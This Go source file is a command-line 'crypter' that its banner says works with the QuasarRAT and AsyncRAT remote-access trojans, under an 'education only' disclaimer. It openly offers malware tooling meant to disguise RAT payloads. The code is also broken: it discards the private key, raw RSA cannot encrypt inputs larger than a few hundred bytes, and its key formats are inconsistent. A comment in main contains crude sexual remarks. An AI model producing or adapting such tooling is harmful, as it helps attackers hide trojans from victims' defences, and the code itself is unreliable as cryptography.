// Build 21/12/2021

package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/fatih/color"
)

// Random key function
func generateKeyPair() (*rsa.PrivateKey, error) {
	// Main part for rsa key gen
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("failed to generate RSA key pair: %w", err)
	}

	return privateKey, nil
}

// Save key function
func savePublicKey(publicKey *rsa.PublicKey, publicKeyPath string) error {
	
	publicKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		return fmt.Errorf("failed to marshal public key: %w", err)
	}

	// Try to make da pem block
	pemBlock := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: publicKeyBytes,
	}

	// write output file 4 public key eiei
	publicKeyFile, err := os.Create(publicKeyPath)
	if err != nil {
		return fmt.Errorf("failed to create public key file: %w", err)
	}
	defer publicKeyFile.Close()

	err = pem.Encode(publicKeyFile, pemBlock)
	if err != nil {
		return fmt.Errorf("failed to write public key to file: %w", err)
	}

	return nil
}

// Encrypt function
func encryptFile(publicKey *rsa.PublicKey, inputFilePath string, outputFilePath string) error {
	
	inputData, err := ioutil.ReadFile(inputFilePath)
	if err != nil {
		return fmt.Errorf("failed to read input file: %w", err)
	}

	encryptedData, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, inputData)
	if err != nil {
		return fmt.Errorf("encryption failed: %w", err)
	}

	err = ioutil.WriteFile(outputFilePath, encryptedData, 0644)
	if err != nil {
		return fmt.Errorf("failed to write encrypted data to output file: %w", err)
	}

	color.Green("Encryption complete.")
	return nil
}

// Main function for this rat crypter 
func main() {
	reader := bufio.NewReader(os.Stdin)

	color.Cyan("Welcome to Love Crypter v.1")
	color.Cyan("Works good with QuasarRAT and AsyncRAT \n")
	color.Cyan("Coded by Skyring0000 https://github.com/TheMajestry")
	color.Red("We didn't support illegal purpose this is for PoC / Education Purpose only <3")
	color.Cyan("Enjoy using!")

	fmt.Print("Input file name: ")
	inputFileName, _ := reader.ReadString('\n')
	inputFileName = strings.TrimSpace(inputFileName)

	fmt.Print("Output file name: ")
	outputFileName, _ := reader.ReadString('\n')
	outputFileName = strings.TrimSpace(outputFileName)

	// I'm feeling horny oh I wish could find a love who can fuck me.
	// Oh I'm cum in my room.
	privateKey, err := generateKeyPair()
	if err != nil {
		color.Red("Failed to generate RSA key pair: %v\n", err)
		os.Exit(1)
	}

	publicKey := &privateKey.PublicKey
	color.Yellow("Public Key:")
	fmt.Println(string(pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: x509.MarshalPKCS1PublicKey(publicKey),
	})))

	publicKeyPath := "public_key.pem"
	err = savePublicKey(publicKey, publicKeyPath)
	if err != nil {
		color.Red("Failed to save public key: %v\n", err)
		os.Exit(1)
	}

	err = encryptFile(publicKey, inputFileName, outputFileName)
	if err != nil {
		color.Red("Encryption failed: %v\n", err)
		os.Exit(1)
	}
}
